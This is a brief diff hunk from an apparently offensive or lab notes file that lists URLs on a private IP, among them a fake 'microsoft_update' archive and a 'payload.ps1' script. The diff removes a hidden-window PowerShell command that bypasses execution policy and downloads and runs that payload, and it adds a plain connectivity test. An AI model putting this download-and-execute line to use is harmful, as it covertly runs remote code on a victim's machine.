@@ -23,7 +23,8 @@ http://192.168.1.137:8080/microsoft_update.page.zip
 
 http://192.168.1.137/payload.ps1
 
-powershell.exe -WindowStyle Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.137/payload.ps1')"
+Test-NetConnection 192.168.1.137 -Port 443
+
 
 
 
